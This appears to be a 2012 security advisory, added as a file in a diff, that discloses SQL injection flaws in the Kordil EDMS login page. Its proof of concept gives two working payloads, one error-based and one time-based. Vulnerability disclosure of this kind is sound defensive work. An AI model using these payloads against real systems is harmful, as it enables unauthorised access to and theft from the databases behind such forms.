@@ -1,0 +1,45 @@
+# Exploit Title: Kordil EDMS v2.2.60rc3 SQL Injection Vulnerability
+# Date: 12/05/2012
+# Exploit Author: Woody Hughes <whughes@ingresssecurity.com>
+# Vendor Homepage: http://sourceforge.net/projects/kordiledms/
+# Software Link: http://sourceforge.net/projects/kordiledms/files/latest/download
+# Version: 2.2.60rc3
+# Tested on: Ubuntu Linux
+
+INGRESS SECURITY SECURITY ADVISORY
+INGRES-12052012-Kordil EDMS v2.2.60rc3 SQL Injection Vulnerability
+December 5, 2012
+
+OVERVIEW
+Ingress Security has found multiple SQL injection vulnerabilities in the Kordil EDMS software.
+
+Kordil EDMS the Electronic Document Management System with power tools is a user friendly document control and management system to gather all documents and key and important information within your organizations under a single database.
+
+AFFECTED PRODUCTS
+Kordil EDMS v2.2.60rc3
+http://sourceforge.net/projects/kordiledms/
+
+PLATFORM: Linux
+
+LOCAL/REMOTE: Remote
+
+CVSS SCORE: 5.5 (AV:R/AC:L/Au:R/C:C/I:C/A:N/B:/E:P/RL:U/RC:C) 
+
+DESCRIPTION OF VULNERABILITIES  
+
+SQL Injection Vulnerability (SQLi)
+
+Proof of Concept:
+URL: http://localhost/kordil/global_group_login.php
+Type: Error-based
+Payload: User=admin&Password=12345' AND EXTRACTVALUE(1299,CONCAT(0x5c,0x3a6a6f793a,(SELECT (CASE WHEN (1299=1299) THEN 1 ELSE 0 END)),0x3a6a77683a)) AND 'hax'='hax&act=n&QS_Submit=Submit
+
+URL: http://localhost/kordil/global_group_login.php
+Type: Blind - Time-based
+Payload: User=admin&Password=12345' AND SLEEP(5) AND 'hax'='hax&act=n&QS_Submit=Submit
+
+DISCLAIMER
+The information provided in this advisory is provided as it is without any warranty. Ingress Security disclaims all warranties, either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Ingress Security or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Ingress Security or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply.
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Ingress Security. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Ingress Security or its suppliers. All pictures, texts, advisories, source code, videos and other information is a trademark of Ingress Security, the specific authors, or managers. To record, list (feed), modify, use, or edit our material, contact info@ingresssecurity.com to get permission.
